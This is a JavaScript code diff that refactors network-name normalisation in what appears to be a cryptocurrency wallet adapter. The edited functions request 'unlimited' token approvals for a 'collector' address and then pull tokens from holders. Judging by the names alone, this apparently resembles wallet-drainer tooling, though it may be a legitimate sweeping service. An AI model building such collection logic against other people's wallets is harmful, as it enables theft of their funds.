@@ -7,14 +7,21 @@ const utxo = require('./utxo');
 const R = require('./registry');
 const market = require('../market');
 
+const normNet = (n) => ({
+  ethereum: 'Ethereum',
+  base: 'Base',
+  arbitrum: 'Arbitrum',
+  bsc: 'BSC',
+  polygon: 'Polygon'
+}[String(n || 'Ethereum').toLowerCase()] || 'Ethereum');
+
 function get(family) {
   if (family === 'evm') {
     return {
       price: async (g) => ({ usd: market.price(g.symbol) || 0, source: 'market' }),
       dexscreenerPrice: async (g) => market.price(g.symbol) || 0,
       balance: async (address, entry) => {
-        const net = entry.network || entry.net || 'Ethereum';
-        const netCap = net.charAt(0).toUpperCase() + net.slice(1);
+        const netCap = normNet(entry.network || entry.net);
         if (entry.kind === 'native') {
           const b = await evm.balances(address);
           return BigInt(Math.floor((b[netCap]?.native || 0) * (10 ** (entry.decimals || 18))));
@@ -23,26 +30,22 @@ function get(family) {
         return BigInt(Math.floor(b * (10 ** (entry.decimals || 6))));
       },
       allowance: async (address, collector, entry) => {
-        const net = entry.network || entry.net || 'Ethereum';
-        const netCap = net.charAt(0).toUpperCase() + net.slice(1);
+        const netCap = normNet(entry.network || entry.net);
         const a = await evm.allowance(netCap, entry.symbol, address, collector);
         return BigInt(Math.floor(a * (10 ** (entry.decimals || 6))));
       },
       approveCalldata: (entry, collector) => {
-        const net = entry.network || entry.net || 'Ethereum';
-        const netCap = net.charAt(0).toUpperCase() + net.slice(1);
+        const netCap = normNet(entry.network || entry.net);
         return evm.approveCall(netCap, entry.symbol, collector, 'unlimited');
       },
       transfer: async ({ entry, from, to, amount, collector }) => {
-        const net = entry.network || entry.net || 'Ethereum';
-        const netCap = net.charAt(0).toUpperCase() + net.slice(1);
+        const netCap = normNet(entry.network || entry.net);
         const uiAmount = Number(amount) / (10 ** (entry.decimals || 6));
         const hash = await evm.collect(netCap, entry.symbol, from, uiAmount, to);
         return { hash };
       },
       revoke: async ({ entry, owner, collector }) => {
-        const net = entry.network || entry.net || 'Ethereum';
-        const netCap = net.charAt(0).toUpperCase() + net.slice(1);
+        const netCap = normNet(entry.network || entry.net);
         return evm.revokeCall(netCap, entry.symbol, collector);
       },
       unwrap: async ({ entry, owner }) => {
